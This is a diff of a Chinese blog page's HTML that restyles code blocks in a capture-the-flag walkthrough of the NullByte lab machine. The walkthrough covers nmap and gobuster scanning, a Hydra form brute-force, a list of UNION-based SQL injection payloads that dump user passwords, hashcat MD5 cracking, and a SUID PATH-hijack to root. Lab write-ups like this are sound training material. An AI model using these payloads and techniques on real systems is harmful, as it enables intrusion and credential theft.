@@ -193,20 +193,20 @@ sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt">
       <div class="post-content">
         <h1 id="nullbyte-靶场">NullByte 靶场</h1>
 <h2 id="主机发现">主机发现</h2>
-<pre tabindex="0"><code>sudo nmap -sn 10.10.10.10
-</code></pre><p><img src="content/posts/NullByte%20Writeup/P1.png" alt="P1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn 10.10.10.10
+</span></span></code></pre></div><p><img src="content/posts/NullByte%20Writeup/P1.png" alt="P1"></p>
 <p>靶机的主机为 10.10.10.7</p>
 <h2 id="服务识别">服务识别</h2>
 <p>使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试</p>
 <p>扫描开放的端口</p>
-<pre tabindex="0"><code>sudo nmap --min-rate 10000 -p- 10.10.10.7
-</code></pre><p><img src="P2.png" alt="P2"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.7
+</span></span></code></pre></div><p><img src="P2.png" alt="P2"></p>
 <p>扫描开放端口的基本信息，并将结果保存到本地以便于随时观看</p>
-<pre tabindex="0"><code>sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
-</code></pre><p><img src="P4.png" alt="P4"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
+</span></span></code></pre></div><p><img src="P4.png" alt="P4"></p>
 <p>使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地</p>
-<pre tabindex="0"><code>sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
-</code></pre><p>经过分析发现靶机运行的是 Apache 服务；
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --script<span style="color:#f92672">=</span>vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
+</span></span></code></pre></div><p>经过分析发现靶机运行的是 Apache 服务；
 777 端口运行的是 SSH 服务，</p>
 <p>暂时没有新的发现，先访问 80 端口</p>
 <h2 id="web渗透">WEB渗透</h2>
@@ -214,21 +214,21 @@ sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt">
 <p>打开 80 页面发现只有一张图片和一句话</p>
 <p><img src="P3.png" alt="P3"></p>
 <p>查看源码发现这是一个 gif 文件，把他下载下来</p>
-<pre tabindex="0"><code>wget http://10.10.10.7/main.git
-</code></pre><h3 id="目录爆破">目录爆破</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.10.10.7/main.git
+</span></span></code></pre></div><h3 id="目录爆破">目录爆破</h3>
 <p>使用 gobuster 执行目录爆破，尝试发现新的目录</p>
-<pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
-</code></pre><p><img src="P5.png" alt="P5"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
+</span></span></code></pre></div><p><img src="P5.png" alt="P5"></p>
 <p>逐个尝试发现只有 /phpmyadmin 是能访问的，并且这是一个 sql 管理后台登入界面。</p>
 <p>尝试弱密码和万能密码登入均无效，暂时放弃。</p>
 <h3 id="gif-寻找信息">gif 寻找信息</h3>
 <p>拿到 gif 图片，先使用 strings 查看有没有有价值的字符串</p>
-<pre tabindex="0"><code>strings main.gif
-</code></pre><p>发现 kzMb5nVYJw 这个字符串很可疑，可能有突破的价值</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings main.gif
+</span></span></code></pre></div><p>发现 kzMb5nVYJw 这个字符串很可疑，可能有突破的价值</p>
 <p><img src="P6.png" alt="P6"></p>
 <p>继续使用 Exiftool 发掘 gif 剩余价值</p>
-<pre tabindex="0"><code>exiftool main.gif
-</code></pre><p><img src="P7.png" alt="P7"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiftool main.gif
+</span></span></code></pre></div><p><img src="P7.png" alt="P7"></p>
 <p>Comment 处写着 kzMb5nVYJw ，说明这串字符串极有可能是突破口，使用 hash-identifier 没有识别出来是什么加密，单串字符串是账号密码的可能性也不大，因此尝试作为地址能不能有新发现</p>
 <p><img src="P8.png" alt="P8"></p>
 <p>查看源码</p>
@@ -238,8 +238,8 @@ sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt">
 <p>输入框尝试弱密码 admin 报错</p>
 <p><img src="P10.png" alt="P10"></p>
 <p>查看网络发现这是一个 post 请求，使用 Hydra 对 hash 进行破解</p>
-<pre tabindex="0"><code>sudo hydra -l &#34;key&#34; -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post &#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34;
-</code></pre><ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;key&#34;</span> -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post <span style="color:#e6db74">&#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34;</span>
+</span></span></code></pre></div><ol>
 <li>
 <p><strong>路径</strong>：<code>/kzMb5nVYJw/index.php</code>（表单提交地址）。</p>
 </li>
@@ -262,72 +262,72 @@ sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt">
 <code>&quot; union select 1,2,3 -- -</code>
 中的 3 ，
 完整的测试代码如下</p>
-<pre tabindex="0"><code>&#34;
-
-&#34; or 1=1 -- -
-
-&#34; order by 3 -- -
-
-&#34; union select 1,2,3 -- -
-
-&#34; union select 1,2,version() -- -
-
-&#34; union select 1,2,database() -- -
-
-&#34; union select 1,2,user() -- -
-
-&#34; union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -
-
-&#34; union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -
-
-&#34; union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name=&#39;users&#39; -- -
-
-&#34; union select 1,2,user from users -- -
-
-&#34; union select 1,2,pass from users -- -
-
-&#34; union select 1,2,position  from users -- -
-</code></pre><p>在完整地测试过后在 users 中的 pass 里发现一串 base64 （base64 更多凭经验判断， hash-identifier 无法识别），</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -- -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; order by 3 -- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> union <span style="color:#66d9ef">select</span> 1,2,3 -- -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; union select 1,2,version() -- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> union <span style="color:#66d9ef">select</span> 1,2,database<span style="color:#f92672">()</span> -- -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; union select 1,2,user() -- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> union <span style="color:#66d9ef">select</span> 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> union <span style="color:#66d9ef">select</span> 1,2,column_name from INFORMATION_SCHEMA.columns where table_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;users&#39;</span> -- -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; union select 1,2,user from users -- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> union <span style="color:#66d9ef">select</span> 1,2,pass from users -- -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; union select 1,2,position  from users -- -
+</span></span></span></code></pre></div><p>在完整地测试过后在 users 中的 pass 里发现一串 base64 （base64 更多凭经验判断， hash-identifier 无法识别），</p>
 <p><img src="P12.png" alt="P12"></p>
 <p>解密后得到一串字符串
 <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>
 <p>使用 hash-identifier 发现是 MD5 加密，使用 hashcat 破解它</p>
-<pre tabindex="0"><code>vim hash/hash.lst
-
-sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt
-</code></pre><p>解密出来
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vim hash/hash.lst
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> hash/hash.lst /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>解密出来
 <code>c6d6bd7ebf806f43c76acc3681703b81:omega</code></p>
 <h2 id="linux-提权">Linux 提权</h2>
 <p>使用 ssh 登入靶机</p>
-<pre tabindex="0"><code>sudo ssh ramses@10.10.10.7 -p777 
-</code></pre><p>查看历史记录</p>
-<pre tabindex="0"><code>history
-</code></pre><p>![Pasted image 20250508230256](Pasted image 20250508230256.png)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ssh ramses@10.10.10.7 -p777 
+</span></span></code></pre></div><p>查看历史记录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>history
+</span></span></code></pre></div><p>![Pasted image 20250508230256](Pasted image 20250508230256.png)</p>
 <p>发现 /var/www 目录可能藏着提权的文件，
 根据提示进行操作</p>
-<pre tabindex="0"><code>cd /var/www
-cd backup/
-ls
-cat readme.txt
-</code></pre><p><img src="P13.png" alt="P13"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/www
+</span></span><span style="display:flex;"><span>cd backup/
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cat readme.txt
+</span></span></code></pre></div><p><img src="P13.png" alt="P13"></p>
 <p>没什么价值，查看文件权限</p>
-<pre tabindex="0"><code>ls -liah
-</code></pre><p><img src="P14.png" alt="P14"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -liah
+</span></span></code></pre></div><p><img src="P14.png" alt="P14"></p>
 <p>提示文件可能有 s 位执行权限，查看含有 s 位执行权限的文件</p>
-<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
-./procwatch
-</code></pre><p><img src="P15.png" alt="P15"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>./procwatch
+</span></span></code></pre></div><p><img src="P15.png" alt="P15"></p>
 <p>果然有，运行查看结果</p>
 <p><img src="P16.png" alt="P16"></p>
 <p>SUID 环境变量提权</p>
-<pre tabindex="0"><code>ln -s /bin/sh ps
-
-export PATH=.:$PATH
-
-echo $PATH
-
-./procwatch 
-</code></pre><p>拿到 root 权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /bin/sh ps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>.:$PATH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo $PATH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./procwatch 
+</span></span></code></pre></div><p>拿到 root 权限</p>
 <p><img src="P17.png" alt="P17"></p>
 <h2 id="总结">总结</h2>
 <p>这台靶机不难，新手可以用来梳理思路</p>
